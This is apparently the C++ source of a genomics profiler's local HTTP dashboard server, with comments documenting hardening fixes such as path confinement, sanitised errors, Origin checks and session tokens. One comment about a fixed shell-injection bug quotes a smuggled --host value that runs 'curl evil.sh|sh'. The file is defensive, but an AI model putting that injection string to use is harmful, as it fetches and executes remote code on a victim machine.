// SPDX-License-Identifier: MIT
#include "profiler/http_server.hpp"

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <deque>
#include <filesystem>
#include <memory>
#include <mutex>
#include <numeric>
#include <random>
#include <sstream>
#include <stdexcept>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>

#include <httplib.h>
#include <nlohmann/json.hpp>

#include "embedded_assets.hpp"
#include "profiler/bed_reader.hpp"
#include "profiler/http_security.hpp"
#include "profiler/matrix_cache.hpp"
#include "profiler/safe_open.hpp"
#include "profiler/secrets.hpp"
#include "profiler/signal_calc.hpp"
#include "profiler/tsv_format.hpp"

#if defined(_WIN32)
#include <windows.h>
#include <shellapi.h>
#else
#include <fcntl.h>
#include <spawn.h>
#include <sys/wait.h>
#include <unistd.h>
extern char** environ;
#endif

#ifndef PROFILER_VERSION
#define PROFILER_VERSION "0.0.0"
#endif

namespace profiler {
namespace {

using json = nlohmann::json;
namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// M4: error responses must not be a filesystem oracle.
//
// resolve_input_path and the BED/BAM readers produce four *distinguishable*
// outcomes, and reflecting any of them verbatim tells an unauthenticated caller
// whether a path exists, whether it is readable, what format it is, and which
// line failed to parse -- a complete existence-and-type oracle at roughly one
// HTTP request per probe, still useful for enumerating inside --data-root even
// with confinement on.
//
// PathError marks every failure whose message may embed a path or file content.
// It derives from std::invalid_argument so existing catch sites keep working,
// but it is caught first and collapsed to ONE message with ONE status code.
// Collapsing matters as much as redacting: distinct replies are the oracle
// regardless of whether a path literally appears in them.
//
// The detail is not discarded -- it goes to stderr, which only the operator
// sees, tagged with a short reference echoed to the client so a bug report can
// be matched to a log line without leaking anything.
class PathError : public std::invalid_argument {
public:
    using std::invalid_argument::invalid_argument;
};

// Short, non-secret correlation id: it identifies a log line and authorises
// nothing, so a PRNG is appropriate here (unlike the session tokens in L9).
std::string error_reference() {
    static std::atomic<std::uint32_t> counter{0};
    static thread_local std::mt19937 rng{std::random_device{}()};
    std::ostringstream out;
    out << std::hex << (rng() & 0xffffffu) << '-'
        << (counter.fetch_add(1, std::memory_order_relaxed) & 0xffffu);
    return out.str();
}

// Logs the real reason; returns the sanitised body to send to the client.
json sanitised_error(const std::exception& error, const char* client_message) {
    const std::string ref = error_reference();
    std::fprintf(stderr, "[cuttag_profiler] request failed (ref %s): %s\n",
                 ref.c_str(), error.what());
    return json{{"error", client_message}, {"ref", ref}};
}

// Converts any failure into PathError, so messages from the BED/GTF parser and
// htslib -- which embed the path, the failing line number and sometimes the
// line's content -- cannot reach a client verbatim.
template <typename Fn>
auto as_path_error(Fn&& fn) -> decltype(fn()) {
    try {
        return fn();
    } catch (const PathError&) {
        throw;
    } catch (const std::exception& error) {
        throw PathError(error.what());
    }
}

// Host/Origin validation lives in profiler/http_security.hpp so it can be
// unit-tested; see tests/test_http_security.cpp.

// The matrix cache and its byte budget live in profiler/matrix_cache.hpp so the
// eviction policy can be tested without standing up a server. It is bounded by
// resident BYTES, not by entry count: `kMaxBins` caps a matrix's width but
// nothing caps its height, so "at most four matrices" was not a memory bound.

// Ceiling on a buffered request body. Every request this API accepts is a small
// JSON object of scalars; the largest legitimate one is a few hundred bytes.
constexpr std::size_t kMaxRequestBodyBytes = 1u << 20;  // 1 MiB

// Socket read/write timeout. Bounds how long one client can occupy a thread
// from the fixed-size pool.
constexpr time_t kSocketTimeoutSeconds = 30;

// Matrix and session tokens both come from profiler::secure_token (L9). The
// only PRNG left in this file is error_reference() above, which names a log
// line and authorises nothing.
constexpr std::size_t kTokenBytes = 32;  // 256 bits, 64 hex characters

ReferencePoint parse_reference_point(const std::string& text) {
    if (text == "center" || text == "Center") return ReferencePoint::kCenter;
    if (text == "TES" || text == "tes") return ReferencePoint::kTES;
    return ReferencePoint::kTSS;
}

const char* reference_point_name(ReferencePoint point) {
    switch (point) {
        case ReferencePoint::kCenter: return "center";
        case ReferencePoint::kTES: return "TES";
        case ReferencePoint::kTSS: return "TSS";
    }
    return "TSS";
}

Normalization parse_normalization(const std::string& text) {
    if (text == "RPKM" || text == "rpkm") return Normalization::kRPKM;
    if (text == "BPM" || text == "bpm") return Normalization::kBPM;
    if (text == "raw" || text == "none" || text == "RAW") return Normalization::kRaw;
    return Normalization::kCPM;
}

const char* normalization_name(Normalization norm) {
    switch (norm) {
        case Normalization::kRPKM: return "RPKM";
        case Normalization::kBPM: return "BPM";
        case Normalization::kRaw: return "raw";
        case Normalization::kCPM: return "CPM";
    }
    return "CPM";
}

// True when `rel` -- the result of fs::relative against the data root -- stays
// inside that root.
//
// L7: this used to be `rel.native().starts_with("..")`, a test on the string
// rather than on the path. I could not find a bypass (fs::relative emits a
// leading ".." component for anything outside the base, and the ec/empty arms
// catch the rest), but it produces a false REJECTION: a legitimate in-root
// file named "..archive.bed" string-starts with ".." and was refused, with an
// error claiming it was outside the data root. More to the point, the check
// was correct by a coincidence of string representation rather than by
// structure, which is one refactor away from being wrong.
//
// Every component is scanned, not just the first. fs::relative normalises, so
// an interior ".." should not occur; checking anyway costs nothing and does
// not depend on that guarantee holding.
bool is_contained(const fs::path& rel) {
    if (rel.empty()) return false;
    for (const auto& part : rel) {
        if (part == "..") return false;
    }
    return true;
}

// One customer file, resolved and opened exactly once.
//
// M6: the previous shape was `fs::exists(candidate)` followed, later and
// elsewhere, by htslib opening the same NAME again. Two lookups of a mutable
// namespace with a gap between them, so anything able to write inside the data
// root could satisfy the check with a real file and be read through a symlink
// -- the canonicalisation that would have caught it having already run.
struct ResolvedInput {
    std::string path;  // canonical; for htslib and for the operator's log
    UniqueFd fd;       // the handle the checks above were actually made against
};

// Confines `raw` to `root`, then opens it.
//
// An empty `root` reaches here ONLY when the operator passed --no-confinement,
// because ServerOptions::validate() rejects an empty data_root otherwise (H2).
// It is no longer the default, and it is no longer reachable by omission.
//
// Throws PathError, never plain std::invalid_argument: every message below
// embeds the caller-supplied path, so all of them must be sanitised (M4).
ResolvedInput resolve_input(const std::string& raw, const std::string& root) {
    if (raw.empty()) throw PathError("empty path");
    std::error_code ec;
    const fs::path resolved = fs::weakly_canonical(fs::path(raw), ec);
    const fs::path candidate = ec ? fs::absolute(fs::path(raw)) : resolved;

    if (!root.empty()) {
        const fs::path root_path = fs::weakly_canonical(fs::path(root), ec);
        const auto rel = fs::relative(candidate, root_path, ec);
        if (ec || !is_contained(rel)) {
            throw PathError("path is outside the permitted data root: " + raw);
        }
    }

    // The existence check IS the open. open_regular_file additionally refuses
    // a symlink final component (O_NOFOLLOW) and anything that is not a
    // regular file -- a FIFO inside the data root passes every path check and
    // then parks this thread in bgzf_open until a writer appears, and httplib's
    // pool is fixed-size, so a handful of those is a denial of service.
    //
    // as_path_error is not used here: everything thrown below is already a
    // PathError, and open_regular_file's message names the path.
    try {
        return ResolvedInput{candidate.string(), open_regular_file(candidate.string())};
    } catch (const std::exception& error) {
        throw PathError(error.what());
    }
}

struct TopRegion {
    std::string name;
    double mean;
    double peak;
};

// Sorts regions by mean signal and collapses them into at most `target_rows`
// averaged bands, so a 100k-region matrix still renders as one image without
// shipping 100k rows to the browser.
json build_heatmap(const SignalMatrix& matrix,
                   const std::vector<std::size_t>& order,
                   std::size_t target_rows) {
    json rows = json::array();
    if (matrix.rows == 0 || target_rows == 0) return rows;

    const std::size_t bands = std::min(target_rows, matrix.rows);
    std::vector<double> accumulator(matrix.cols, 0.0);

    for (std::size_t b = 0; b < bands; ++b) {
        const std::size_t begin = (matrix.rows * b) / bands;
        const std::size_t end = (matrix.rows * (b + 1)) / bands;
        if (begin >= end) continue;

        std::fill(accumulator.begin(), accumulator.end(), 0.0);
        for (std::size_t i = begin; i < end; ++i) {
            const double* row = matrix.values.data() + order[i] * matrix.cols;
            for (std::size_t c = 0; c < matrix.cols; ++c) accumulator[c] += row[c];
        }
        const double denom = static_cast<double>(end - begin);
        json band = json::array();
        for (double v : accumulator) band.push_back(v / denom);
        rows.push_back(std::move(band));
    }
    return rows;
}

}  // namespace

// --- Impl ------------------------------------------------------------------

struct HttpServer::Impl {
    httplib::Server server;

    std::mutex reader_mutex;
    std::unordered_map<std::string, std::shared_ptr<BamReader>> readers;

    MatrixCache matrices;

    // BAM handles and their indices are expensive to load, so a reader is kept
    // alive per file for the lifetime of the process.
    std::shared_ptr<BamReader> reader_for(const std::string& path) {
        std::lock_guard<std::mutex> lock(reader_mutex);
        auto it = readers.find(path);
        if (it != readers.end()) return it->second;
        auto reader = std::make_shared<BamReader>(path);
        readers.emplace(path, reader);
        return reader;
    }

    std::string remember(std::shared_ptr<SignalMatrix> matrix) {
        return matrices.remember(std::move(matrix));
    }

    std::shared_ptr<SignalMatrix> recall(const std::string& token) {
        return matrices.recall(token);
    }
};

// ---------------------------------------------------------------------------
// H2: confinement is mandatory, and validated on the type.
//
// Empty `data_root` used to mean "no confinement", so the shipped default was
// an unauthenticated arbitrary file read of anything the process uid could
// open. The unsafe state was reachable by omission -- you got it by not
// thinking about it, which is the worst possible ergonomics for a security
// control.
//
// Now the only way to run unconfined is to say so explicitly, and the check
// lives here rather than in main.cpp's parser so that a test, a library
// embedding, or a future second entry point cannot bypass it. That is the
// lesson of REVIEW_2026-08-15 finding 2, where the CLI validated options the
// HTTP handler did not.
void ServerOptions::validate() {
    // Combinations that publish an unauthenticated read to the network. These
    // live here, ahead of the confinement checks, for the same reason the
    // confinement checks moved here: main.cpp's parser is the friendly front
    // end, not the control, and a test or a library embedding must not be able
    // to construct a configuration the CLI would have refused.
    if (!loopback_only && !require_token) {
        throw std::invalid_argument(
            "--allow-remote with --no-auth would publish this API to the "
            "network with no authentication at all. Refusing. Drop --no-auth: "
            "the session token is what makes a non-loopback bind survivable, "
            "and the startup banner prints the URL that carries it.");
    }
    if (!loopback_only && confinement_disabled) {
        throw std::invalid_argument(
            "--no-confinement with --allow-remote would publish an "
            "unauthenticated read of every file this process can open to the "
            "network. Refusing. Pass --data-root DIR instead.");
    }

    if (confinement_disabled) {
        if (!data_root.empty()) {
            throw std::invalid_argument(
                "--data-root and --no-confinement are mutually exclusive; pass one");
        }
        return;  // caller has opted out in as many words; main() warns loudly
    }

    if (data_root.empty()) {
        throw std::invalid_argument(
            "--data-root is required.\n"
            "\n"
            "Without it the server resolves any path a client asks for, which is "
            "an unauthenticated arbitrary file read (SECURITY_HTTP H2). It has no "
            "authentication of its own, so the only thing bounding what a request "
            "can reach is this directory.\n"
            "\n"
            "  cuttag_profiler serve --data-root /path/to/experiments\n"
            "\n"
            "To run unconfined anyway -- only ever on a single-user machine you "
            "trust, and never with --allow-remote -- say so explicitly:\n"
            "\n"
            "  cuttag_profiler serve --no-confinement");
    }

    std::error_code ec;
    const fs::path canonical = fs::weakly_canonical(fs::path(data_root), ec);
    if (ec) {
        throw std::invalid_argument("--data-root could not be resolved: " + data_root);
    }
    if (!fs::exists(canonical, ec) || ec) {
        throw std::invalid_argument("--data-root does not exist: " + data_root);
    }
    if (!fs::is_directory(canonical, ec) || ec) {
        throw std::invalid_argument("--data-root is not a directory: " + data_root);
    }

    // Store the canonical form. resolve_input_path canonicalises the *request*
    // path before comparing, so an un-canonicalised root (a symlink, a trailing
    // "/.", a relative path) would compare against a different string than the
    // one it is meant to bound and reject everything -- fail-closed, but
    // baffling. Normalise once, here.
    data_root = canonical.string();
}

HttpServer::HttpServer(ServerOptions options)
    : impl_(std::make_unique<Impl>()), options_(std::move(options)) {
    options_.validate();
    // Minted here rather than in run() so that a caller can read
    // session_token() before run() blocks -- tests do, and so would any
    // embedding that wants to print its own banner. secure_token throws if the
    // platform cannot supply entropy, which fails construction: a server that
    // came up anyway would be serving behind a predictable secret.
    if (options_.require_token) {
        session_token_ = secure_token(kTokenBytes);
    }
}

HttpServer::~HttpServer() = default;

void HttpServer::stop() { impl_->server.stop(); }

void HttpServer::run() {
    if (options_.loopback_only && options_.host != "127.0.0.1" &&
        options_.host != "localhost" && options_.host != "::1") {
        throw std::runtime_error(
            "refusing to bind to non-loopback host '" + options_.host +
            "': the dashboard is designed to never be reachable off-box "
            "(pass --allow-remote to override deliberately)");
    }

    auto& server = impl_->server;

    // -----------------------------------------------------------------------
    // H3 / H1(a,b): Host and Origin validation, before any route runs.
    //
    // A pre-routing handler so no endpoint -- present or future -- can forget
    // it. Scoped to /api/: the static assets are non-sensitive rodata, and the
    // dashboard has to load before it can issue an API call.
    //
    // What this closes and what it does not:
    //   * DNS rebinding IS blocked: a rebound page still sends the attacker's
    //     hostname in Host, because Host reflects the URL the page came from.
    //   * Cross-origin requests ARE blocked, including the no-preflight
    //     text/plain CSRF shape (Origin check plus the Content-Type gate on
    //     POST /api/profile).
    //   * A hostile process running as another user ON THIS MACHINE is NOT
    //     blocked by either of those -- it can send any header it likes. That
    //     is what the session token (H1c) is for, and it is the third check
    //     below. Header validation binds the browser threat model; the token
    //     binds everything else.
    server.set_pre_routing_handler(
        [this](const httplib::Request& req, httplib::Response& res)
            -> httplib::Server::HandlerResponse {
            if (req.path.rfind("/api/", 0) != 0) {
                return httplib::Server::HandlerResponse::Unhandled;
            }

            if (options_.loopback_only &&
                !host_header_is_local(req.get_header_value("Host"), bound_port_)) {
                res.status = 421;  // Misdirected Request
                res.set_content(json{{"error", "unrecognised Host header"}}.dump(),
                                "application/json");
                return httplib::Server::HandlerResponse::Handled;
            }

            // An absent Origin is normal for same-origin GETs and for curl; a
            // present one must name this server. Browsers send Origin on
            // same-origin POSTs too, so rejecting every Origin would break the
            // shipped dashboard while still looking like a working control.
            if (const std::string origin = req.get_header_value("Origin");
                !origin.empty() && !origin_is_self(origin, bound_port_)) {
                res.status = 403;
                res.set_content(
                    json{{"error", "cross-origin requests are refused"}}.dump(),
                    "application/json");
                return httplib::Server::HandlerResponse::Handled;
            }

            // (c) The session token. Unlike the two checks above, this one
            // does not depend on the caller being a browser: a local process
            // running as another uid can forge Host and Origin, and cannot
            // forge 256 bits it has never seen.
            //
            // Accepted two ways. `?t=` is what the dashboard uses, because the
            // token arrives in the URL the operator opened and every fetch can
            // append it without a bootstrap step. `Authorization: Bearer` is
            // for curl and scripts, and is the form to prefer -- a query
            // parameter can end up in a proxy log or a Referer, which is why
            // the assets already send Referrer-Policy: no-referrer.
            if (options_.require_token) {
                std::string presented = req.get_param_value("t");
                if (presented.empty()) {
                    const std::string auth = req.get_header_value("Authorization");
                    constexpr std::string_view kBearer = "Bearer ";
                    if (auth.rfind(kBearer, 0) == 0) {
                        presented = auth.substr(kBearer.size());
                    }
                }
                // constant_time_equals, not ==: this is the comparison an
                // attacker gets to repeat as often as they like (L9).
                if (!constant_time_equals(presented, session_token_)) {
                    res.status = 401;
                    res.set_content(
                        json{{"error", "missing or invalid session token"}}.dump(),
                        "application/json");
                    return httplib::Server::HandlerResponse::Handled;
                }
            }

            // API replies carry experiment data and matrix tokens: keep them out
            // of shared caches, and keep the dashboard out of frames.
            res.set_header("Cache-Control", "no-store");
            res.set_header("X-Frame-Options", "DENY");
            return httplib::Server::HandlerResponse::Unhandled;
        });

    // Resource limits, set BEFORE any route is registered.
    //
    // cpp-httplib defaults CPPHTTPLIB_PAYLOAD_MAX_LENGTH to SIZE_MAX, i.e. no
    // limit at all, and buffers the whole request body in memory before a
    // handler ever runs. Measured against the unpatched build: one unauthenticated
    // 200 MB POST to /api/profile took the server from 6 MB RSS to 1.51 GB -- a
    // ~7.5x amplification, because the body is buffered, then parsed by
    // nlohmann::json, then echoed back inside the error string. A handful of
    // concurrent requests OOM-kill the process.
    //
    // This runs before ProfileOptions::validate() and before resolve_input_path,
    // so neither the window guards nor --data-root confinement help; the limit
    // has to live here. Every legitimate request body on this API is a small
    // JSON object of scalars, so 1 MiB is generous by three orders of magnitude.
    server.set_payload_max_length(kMaxRequestBodyBytes);

    // A slow-loris client otherwise holds a pooled thread indefinitely; the
    // pool is fixed-size, so a few dozen idle sockets deny service outright.
    server.set_read_timeout(kSocketTimeoutSeconds, 0);
    server.set_write_timeout(kSocketTimeoutSeconds, 0);

    // Static assets, straight out of the binary's rodata.
    for (unsigned long i = 0; i < assets::kAssetCount; ++i) {
        const auto& asset = assets::kAssets[i];
        const std::string path = asset.path;
        auto handler = [&asset](const httplib::Request&, httplib::Response& res) {
            res.set_content(reinterpret_cast<const char*>(asset.data),
                            static_cast<std::size_t>(asset.size), asset.mime);
            // Nothing here may reach off-box, even if an asset were tampered with.
            res.set_header("Content-Security-Policy",
                           "default-src 'self'; script-src 'unsafe-inline' 'self'; "
                           "style-src 'unsafe-inline' 'self'; img-src 'self' data:; "
                           "connect-src 'self'; base-uri 'none'; form-action 'none'");
            res.set_header("X-Content-Type-Options", "nosniff");
            res.set_header("Referrer-Policy", "no-referrer");
        };
        server.Get(path, handler);
        if (path == "/index.html") server.Get("/", handler);
    }

    server.Get("/api/health", [](const httplib::Request&, httplib::Response& res) {
        json body{{"status", "ok"},
                  {"version", PROFILER_VERSION},
                  {"threads", std::thread::hardware_concurrency()}};
        res.set_content(body.dump(), "application/json");
    });

    // Header contigs for a BAM, so the UI can validate a region file early.
    server.Get("/api/chroms", [this](const httplib::Request& req,
                                     httplib::Response& res) {
        try {
            // The descriptor is verified and then released: BamReader needs
            // the NAME, because htslib loads the .bai through a path
            // (sam_index_load) and hands out one file handle per worker
            // thread. So the FIFO, device-node and symlink-final-component
            // cases are closed before htslib sees the file, but the last
            // check-to-open gap for BAMs is not -- closing it means teaching
            // BamReader to work from a descriptor, which the index rules out
            // today. Region files, which is where M5's exfiltration primitive
            // lives, are read straight from the descriptor below.
            const ResolvedInput bam = resolve_input(req.get_param_value("bam"),
                                                    options_.data_root);
            auto reader = as_path_error([&] { return impl_->reader_for(bam.path); });
            json chroms = json::array();
            const auto& names = reader->chromosomes();
            const auto& lengths = reader->chromosome_lengths();
            for (std::size_t i = 0; i < names.size(); ++i) {
                chroms.push_back({{"name", names[i]}, {"length", lengths[i]}});
            }
            json body{{"chromosomes", chroms},
                      {"totalMappedReads", reader->total_mapped_reads()}};
            res.set_content(body.dump(), "application/json");
        } catch (const PathError& error) {
            // One message, one status, for every path outcome -- existing,
            // absent, unreadable, wrong format. Distinct replies are the oracle.
            res.status = 400;
            res.set_content(sanitised_error(error, "the requested file could not be read; check the server log for the reason").dump(),
                            "application/json");
        } catch (const std::exception& error) {
            // Parameter-validation messages (bin size, window bounds) carry no
            // filesystem information and stay useful to the caller.
            res.status = 400;
            res.set_content(json{{"error", error.what()}}.dump(), "application/json");
        }
    });

    server.Post("/api/profile", [this](const httplib::Request& req,
                                       httplib::Response& res) {
        try {
            // Belt and braces alongside the Origin check: a cross-origin page
            // can only send application/json by first passing a CORS preflight,
            // which this server never answers. json::parse does not care what
            // Content-Type claimed, so without this the endpoint stays reachable
            // by the no-preflight text/plain shape if the pre-routing handler is
            // ever reordered or rescoped.
            if (req.get_header_value("Content-Type").rfind("application/json", 0) != 0) {
                res.status = 415;  // Unsupported Media Type
                res.set_content(
                    json{{"error", "Content-Type must be application/json"}}.dump(),
                    "application/json");
                return;
            }
            const json request = json::parse(req.body);

            ResolvedInput bam = resolve_input(
                request.value("bam", std::string{}), options_.data_root);
            ResolvedInput region_file = resolve_input(
                request.value("regions", std::string{}), options_.data_root);

            ProfileOptions opts;
            opts.reference_point =
                parse_reference_point(request.value("referencePoint", "TSS"));
            opts.upstream = request.value("upstream", std::int64_t{2000});
            opts.downstream = request.value("downstream", std::int64_t{2000});
            // No std::max(1, ...) clamp: silently rewriting a client's
            // binSize: 0 to 1 returns a plausible-looking matrix at a
            // resolution they did not ask for. validate() rejects it with a
            // message instead.
            opts.bin_size = request.value("binSize", std::int64_t{50});
            opts.normalization =
                parse_normalization(request.value("normalization", "CPM"));
            opts.count_mode = request.value("countMode", std::string{"reads"}) == "depth"
                                  ? CountMode::kDepth
                                  : CountMode::kReads;
            opts.respect_strand = request.value("respectStrand", true);
            // Read as int64 and range-checked before narrowing: reading these
            // as int let nlohmann cast a JSON 4294967296 straight to 0, past
            // every guard below (the CLI had the same fault, 2026-09-11).
            opts.threads = narrow_option(request.value("threads", std::int64_t{0}), 0,
                                         ProfileOptions::kMaxThreads, "threads");

            FilterOptions filters;
            filters.min_mapq =
                narrow_option(request.value("minMapq", std::int64_t{0}), 0, 255, "minMapq");
            filters.max_fragment_length =
                request.value("maxFragmentLength", std::int64_t{1000});
            filters.extend_to_fragment = request.value("extendToFragment", true);
            filters.extend_reads_to =
                request.value("extendReadsTo", std::int64_t{0});
            if (request.value("properPairsOnly", false)) {
                filters.require_flags |= flags::kProperPair;
            }

            // Every guard, on every entry path. This handler previously applied
            // only the window_length() check, so an unauthenticated client could
            // reach compute_matrix with upstream: 2000000000 (80M bins, 640 MB
            // of double per region -> SIGKILL) or upstream: INT64_MAX (signed
            // overflow inside window_length() itself, evaluated before the guard
            // could see it). The handler returns 400 with the exception text, so
            // these now surface as proper client errors.
            opts.validate();
            filters.validate();

            // Parsed from the DESCRIPTOR opened above, never from the name
            // again (M6). Between resolve_input and here the path could have
            // been repointed; the descriptor cannot be.
            const auto regions = as_path_error([&] {
                return read_regions_from_fd(std::move(region_file.fd), region_file.path);
            });
            if (regions.empty()) {
                throw PathError("no regions parsed from " + region_file.path);
            }

            auto reader = as_path_error([&] { return impl_->reader_for(bam.path); });
            auto matrix = std::make_shared<SignalMatrix>(
                compute_matrix(*reader, regions, opts, filters));

            // Rank regions by mean signal; used for both the heatmap ordering
            // and the top-regions table.
            std::vector<double> means(matrix->rows, 0.0);
            for (std::size_t r = 0; r < matrix->rows; ++r) {
                const double* row = matrix->values.data() + r * matrix->cols;
                means[r] = std::accumulate(row, row + matrix->cols, 0.0) /
                           static_cast<double>(matrix->cols);
            }
            std::vector<std::size_t> order(matrix->rows);
            std::iota(order.begin(), order.end(), std::size_t{0});
            std::sort(order.begin(), order.end(),
                      [&means](std::size_t a, std::size_t b) {
                          return means[a] > means[b];
                      });

            const auto top_count = std::min<std::size_t>(
                matrix->rows, request.value("topRegions", std::size_t{50}));
            json top = json::array();
            for (std::size_t i = 0; i < top_count; ++i) {
                const std::size_t r = order[i];
                const double* row = matrix->values.data() + r * matrix->cols;
                top.push_back({{"name", matrix->row_names[r]},
                               {"mean", means[r]},
                               {"peak", *std::max_element(row, row + matrix->cols)}});
            }

            const auto heatmap_rows =
                request.value("heatmapRows", std::size_t{400});

            json body{
                {"profile", matrix->column_mean},
                {"binOffsets", matrix->bin_offsets},
                {"heatmap", build_heatmap(*matrix, order, heatmap_rows)},
                {"topRegions", std::move(top)},
                {"regions", matrix->rows},
                {"regionsSkipped", matrix->regions_skipped},
                {"totalMappedReads", matrix->total_mapped_reads},
                {"elapsedSeconds", matrix->elapsed_seconds},
                {"scaleFactor", matrix->scale_factor},
                {"normalization", normalization_name(opts.normalization)},
                {"referencePoint", reference_point_name(opts.reference_point)},
                {"binSize", opts.bin_size},
                {"threads", opts.threads > 0
                                ? opts.threads
                                : static_cast<int>(std::thread::hardware_concurrency())},
                {"token", impl_->remember(matrix)}};

            res.set_content(body.dump(), "application/json");
        } catch (const PathError& error) {
            res.status = 400;
            res.set_content(sanitised_error(error, "the requested file could not be read; check the server log for the reason").dump(),
                            "application/json");
        } catch (const json::exception& error) {
            res.status = 400;
            res.set_content(json{{"error", std::string("malformed request: ") +
                                               error.what()}}
                                .dump(),
                            "application/json");
        } catch (const std::exception& error) {
            res.status = 400;
            res.set_content(json{{"error", error.what()}}.dump(), "application/json");
        }
    });

    // Streams the full matrix for the most recent runs as TSV. Kept out of the
    // /api/profile payload because 100k x 80 doubles is not worth serialising
    // into JSON on every interaction.
    server.Get("/api/matrix", [this](const httplib::Request& req,
                                     httplib::Response& res) {
        auto matrix = impl_->recall(req.get_param_value("token"));
        if (!matrix) {
            res.status = 404;
            res.set_content(json{{"error", "unknown or expired matrix token"}}.dump(),
                            "application/json");
            return;
        }
        // format_matrix_tsv (tsv_format.hpp) builds directly into the string
        // that becomes the response body; moving it into set_content rather
        // than copying removes the two extra copies an ostringstream ->
        // .str() -> set_content(const std::string&) chain used to make of a
        // matrix that is 73 MB at the module's own README benchmark geometry.
        res.set_content(format_matrix_tsv(*matrix), "text/tab-separated-values");
        res.set_header("Content-Disposition", "attachment; filename=\"matrix.tsv\"");
    });

    server.set_exception_handler(
        [](const httplib::Request&, httplib::Response& res, std::exception_ptr ep) {
            // Anything reaching here escaped a handler's own catch blocks, so
            // its text is unaudited and may embed a path or an htslib internal.
            // Log it; return nothing but a reference (M4).
            json body{{"error", "internal error"}};
            try {
                std::rethrow_exception(ep);
            } catch (const std::exception& error) {
                body = sanitised_error(error, "internal error");
            } catch (...) {
                body = json{{"error", "internal error"}, {"ref", error_reference()}};
                std::fprintf(stderr,
                             "[cuttag_profiler] request failed with a non-std exception\n");
            }
            res.status = 500;
            res.set_content(body.dump(), "application/json");
        });

    bound_port_ = server.bind_to_port(options_.host, options_.port) ? options_.port : 0;
    if (bound_port_ == 0) {
        bound_port_ = server.bind_to_any_port(options_.host);
        if (bound_port_ <= 0) {
            throw std::runtime_error("cannot bind to " + options_.host + ":" +
                                     std::to_string(options_.port));
        }
        std::fprintf(stderr, "port %d unavailable; using %d instead\n",
                     options_.port, bound_port_);
    }

    // The token rides in the URL so the operator never has to copy it: opening
    // the printed link is the whole authentication step. The dashboard reads
    // it back out of location.search and appends it to every API call.
    const std::string url =
        "http://" + options_.host + ":" + std::to_string(bound_port_) + "/" +
        (session_token_.empty() ? "" : "?t=" + session_token_);
    std::printf("cuttag_profiler dashboard ready at %s\n", url.c_str());
    if (session_token_.empty()) {
        std::printf("  WARNING: --no-auth is set; any local process can read "
                    "through this API\n");
    } else {
        std::printf("  that URL contains this run's session token; anyone who "
                    "has it can query the API\n");
    }
    std::printf("  no data leaves this machine; press Ctrl-C to stop\n");
    std::fflush(stdout);

    if (options_.open_browser) {
        std::thread([url] {
            std::this_thread::sleep_for(std::chrono::milliseconds(250));
            open_in_browser(url);
        }).detach();
    }

    server.listen_after_bind();
}

// Opens `url` in the platform browser WITHOUT a shell.
//
// L8: this used to build a command string and hand it to std::system. The
// comment said the URL was "only ever a loopback URL constructed above, never
// user-supplied text", and that was wrong: the URL embeds options_.host, which
// comes straight from --host, and --allow-remote lifts the loopback
// restriction that otherwise constrains it to three literals. A single quote
// in the value closed the quoting:
//
//     cuttag_profiler serve --allow-remote --host "x'; curl evil.sh|sh; echo '"
//
// The operator already has a shell, so this is a footgun rather than a
// privilege boundary -- until the serve options come from a config file, a job
// scheduler or a wrapper that passes a hostname through, at which point it is
// a real one. Either way there is no reason to involve a shell to open a URL.
//
// posix_spawnp rather than fork+exec: `serve` has threads running by the time
// this is called (the browser launch is itself on a detached thread), and
// between fork and exec only async-signal-safe calls are legal in the child.
// posix_spawn does that window inside the implementation and never returns to
// arbitrary C++ in the child.
void open_in_browser(const std::string& url) {
#if defined(_WIN32)
    // ShellExecute takes the URL as a single argument; there is no command
    // line for anything in it to be re-parsed out of.
    const bool ok = reinterpret_cast<INT_PTR>(::ShellExecuteA(
                        nullptr, "open", url.c_str(), nullptr, nullptr,
                        SW_SHOWNORMAL)) > 32;
#else
#if defined(__APPLE__)
    const char* opener = "open";
#else
    const char* opener = "xdg-open";
#endif
    // execv's argv is char* const[] for historical reasons; the strings are
    // not written to, and they outlive the call.
    char* const argv[] = {const_cast<char*>(opener),
                          const_cast<char*>(url.c_str()), nullptr};

    // The URL now carries the session token, so it must not land in the
    // terminal via a helper's chatter -- and a browser's stdout/stderr is
    // noise on the operator's console regardless. Redirect both to /dev/null
    // in the child through a spawn file-actions object, which is the
    // shell-free equivalent of the `>/dev/null 2>&1` that was in the command
    // string.
    posix_spawn_file_actions_t actions;
    bool have_actions = ::posix_spawn_file_actions_init(&actions) == 0;
    if (have_actions) {
        ::posix_spawn_file_actions_addopen(&actions, STDOUT_FILENO, "/dev/null",
                                           O_WRONLY, 0);
        ::posix_spawn_file_actions_adddup2(&actions, STDOUT_FILENO, STDERR_FILENO);
    }

    pid_t pid = 0;
    const int rc = ::posix_spawnp(&pid, opener, have_actions ? &actions : nullptr,
                                  nullptr, argv, environ);
    if (have_actions) ::posix_spawn_file_actions_destroy(&actions);

    bool ok = false;
    if (rc == 0) {
        // Reaped so the helper does not linger as a zombie for the lifetime of
        // the server. posix_spawnp reports only its own failures, not the
        // exec's, so a missing xdg-open surfaces here as exit status 127.
        int status = 0;
        ok = ::waitpid(pid, &status, 0) == pid && WIFEXITED(status) &&
             WEXITSTATUS(status) == 0;
    }
#endif
    if (!ok) {
        std::fprintf(stderr, "could not launch a browser; open %s manually\n",
                     url.c_str());
    }
}

}  // namespace profiler
